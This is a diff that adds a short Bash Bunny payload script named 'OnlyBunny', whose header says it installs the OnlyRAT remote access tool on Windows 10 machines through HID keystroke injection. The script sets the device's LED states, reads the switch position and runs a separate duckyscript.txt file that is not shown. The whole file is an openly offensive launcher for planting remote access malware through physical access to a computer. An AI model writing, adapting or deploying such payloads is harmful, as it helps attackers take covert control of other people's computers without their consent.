@@ -1,0 +1,17 @@
+# Title: 		OnlyBunny 
+# Description:	Installs OnlyRAT on computers
+# Author:		Blue Cosmo
+# Category:		remote access
+# Target:		Windows 10
+# Attackmodes:	HID
+
+# setup payload
+LED SETUP
+ATTACKMODE HID
+GET SWITCH_POSITION
+
+# execute duckyscript
+LED STAGE1
+QUACK ${SWITCH_POSITION}/duckyscript.txt
+
+LED FINISH
